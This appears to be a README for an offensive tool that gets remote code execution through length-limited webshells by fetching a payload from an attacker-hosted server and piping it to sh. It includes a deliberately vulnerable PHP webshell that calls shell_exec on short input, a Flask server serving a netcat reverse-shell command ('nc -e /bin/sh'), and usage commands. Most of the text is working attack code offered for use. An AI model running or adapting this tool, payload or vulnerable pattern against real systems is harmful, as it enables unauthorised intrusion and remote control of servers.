# Description
Tool to RCE in limited input length webshells.  
It pipes the payload to sh, you can customize it with a few changes in the source code (python is already done, just uncomment it), also you could modify it to execute commands directly.

# Usage
```
python3 lentool.py -t http://targetexample.com/?start -u http://myserverexample.com
--target, -t: Target URL with param.  
--url, -u: Web server hosting the payload.
```
 # POC
 Vulnerable application:
 ```php
 <?php
 
$sandbox = '/home/estse/sandbox/';
@mkdir($sandbox);
@chdir($sandbox);

if (!isset($_GET['start'])){
	show_source(__FILE__);
	exit;
}

// This will return output only for id and ps.
if (strlen($_GET['start']) < 5){
	echo shell_exec($_GET['start']);
} else {
	echo "Please enter a valid command";
}

?>
 ```
 Flask server to host the payload:
 ```python
 from flask import Flask, Response
 
app = Flask(__name__)
 
@app.route('/')
def i():
    return Response("nc -e /bin/sh 127.0.0.1 1234", headers={'Content-Type': 'text/plain'}, status=200)
 
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=4321)
 ```
 Run:
 ```
 python3 lentool.py -t http://127.0.0.1:1808?start -u 127.0.0.1:4321
 ```
 ![2022-02-17_15-40-38 (online-video-cutter com)](https://user-images.githubusercontent.com/40002393/154507056-1b5bea67-38ca-4b2d-bede-90d4069ca52d.gif)
